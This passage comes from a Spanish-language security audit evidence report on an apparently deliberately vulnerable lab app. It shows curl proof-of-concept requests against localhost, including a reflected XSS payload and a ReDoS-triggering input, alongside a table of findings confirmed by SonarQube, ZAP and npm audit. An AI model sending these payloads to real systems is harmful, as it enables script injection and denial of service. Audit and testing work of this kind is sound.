Cache-Control: public, max-age=86400            ← caché insegura
Access-Control-Allow-Origin: *                  ← CORS sin restricciones
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS,TRACE  ← TRACE habilitado
Content-Type: application/json; charset=utf-8
```

**Hallazgos confirmados:** SEC-015 (headers informativos), SEC-017 (CORS + TRACE), SEC-018 (sin CSP/HSTS)

### 5.13 Verificación — ReDoS (Denegación de Servicio por Regex)

```bash
$ curl -s "http://localhost:4000/api/legacy/regex?input=aaaaaaaaaaaaaaa!"
# [El servidor demora varios segundos en responder — backtracking catastrófico]

{"input":"aaaaaaaaaaaaaaa!","matched":false}
```

**Hallazgo confirmado:** SEC-025 (ReDoS)

### 5.14 Verificación — XSS Reflejado

```bash
$ curl -s "http://localhost:4000/api/admin/lab/xss?msg=<script>alert(1)</script>"

<html>
  <head><title>Reflected XSS Lab</title></head>
  <body>
    <h1>Resultado de diagnostico</h1>
    <div id="message"><script>alert(1)</script></div>    ← XSS sin sanitizar
    <form method="GET" action="/api/admin/lab/xss">
      <input name="msg" value="<script>alert(1)</script>">
      <button>Probar</button>
    </form>
  </body>
</html>
```

**Hallazgo confirmado:** SEC-011 (XSS reflejado)

---

## 6. RESUMEN DE CONFIRMACIÓN CRUZADA

| ID | Hallazgo | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Curl/HTTP |
|---|---|:---:|:---:|:---:|:---:|:---:|
| SEC-001 | Inyección SQL múltiple | ✅ | ⚠️ Parcial | ❌ | ❌ | ✅ |
| SEC-003 | Autenticación rota | ✅ | ❌ | ❌ | ❌ | ✅ |
| SEC-004 | RCE via exec() | ✅ | ⚠️ Hotspot | ❌ | ❌ | ✅ |
| SEC-005 | RCE via eval() | ✅ | ✅ Hotspot | ❌ | ❌ | ✅ |
| SEC-006 | Sin control de acceso | ✅ | ❌ | ⚠️ Parcial | ❌ | ✅ |
| SEC-007 | Credenciales hardcodeadas | ✅ | ✅ BLOCKER | ❌ | ❌ | ✅ |
| SEC-008 | Variables de entorno expuestas | ✅ | ❌ | ⚠️ ZAP-API-003 | ❌ | ✅ |
| SEC-009 | SSRF | ✅ | ❌ | ❌ | ✅ request | ✅ |
| SEC-010 | XSS Almacenado | ✅ | ❌ | ❌ | ❌ | ✅ |
| SEC-011 | XSS Reflejado | ✅ | ❌ | ❌ | ❌ | ✅ |
| SEC-013 | Path Traversal | ✅ | ❌ | ❌ | ❌ | ✅ |
| SEC-015 | Headers inseguros | ✅ | ✅ S5689 | ✅ ZAP-API-003 | ❌ | ✅ |
| SEC-017 | CORS abierto | ✅ | ✅ S5122 | ✅ ZAP-API-001 | ❌ | ✅ |
| SEC-018 | Sin CSP/HSTS | ✅ | ❌ | ✅ ZAP-FE-001 | ❌ | ✅ |
| SEC-025 | ReDoS | ✅ | ✅ Hotspot×2 | ❌ | ✅ lodash | ✅ |
| SEC-026 | Criptografía débil | ✅ | ✅ Hotspot | ❌ | ❌ | ✅ |
| CAL-002 | Complejidad alta (CC=61) | ✅ | ✅ CRITICAL | ❌ | ❌ | — |
| CAL-007 | Credenciales hardcodeadas FE | ✅ | ✅ S2068 | ❌ | ❌ | — |
| DEP-001 | request SSRF (deprecated) | ✅ | ❌ | ❌ | ✅ CRITICAL | — |
| DEP-002 | form-data boundary inseguro | ❌ | ❌ | ❌ | ✅ CRITICAL | — |
| DEP-003 | axios CSRF | ✅ | ❌ | ❌ | ✅ HIGH | — |
| DEP-004 | express XSS redirect | ✅ | ❌ | ❌ | ✅ HIGH | — |
| DEP-005 | jsonwebtoken bypass | ✅ | ❌ | ❌ | ✅ HIGH | — |
| DEP-006 | lodash Command Injection | ✅ | ❌ | ❌ | ✅ HIGH | — |

**Leyenda:** ✅ Confirmado | ⚠️ Parcial | ❌ No detectado | — No aplica

---

## 7. ARCHIVOS GENERADOS POR LAS HERRAMIENTAS

```
auditoria/
├── evidencias_zap/
│   ├── zap_report_api.html          (reporte HTML completo ZAP - API :4000)
│   ├── zap_report_frontend.html     (reporte HTML completo ZAP - Frontend :5173)
│   └── npm_audit_backend.txt        (salida completa de npm audit)
├── evidencias_herramientas.md       (este documento)
├── informe_ejecutivo.md             (Entregable 1)
├── informe_tecnico_completo.md      (Entregable 2 — unificado)
├── informe_tecnico_parte1.md        (secciones 1-5)
└── informe_tecnico_parte2.md        (secciones 6-9 + conclusiones)
```

Los reportes HTML de ZAP (`zap_report_api.html` y `zap_report_frontend.html`) contienen el reporte gráfico interactivo completo generado por OWASP ZAP 2.17.0 con todos los detalles de las alertas, URLs afectadas, evidencias de solicitudes/respuestas HTTP y recomendaciones de remediación.

---

*Documento generado como parte de la auditoría técnica de CarteraPro Risk Lab*
*Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software | 2026-06-13*
*Clasificación: CONFIDENCIAL*
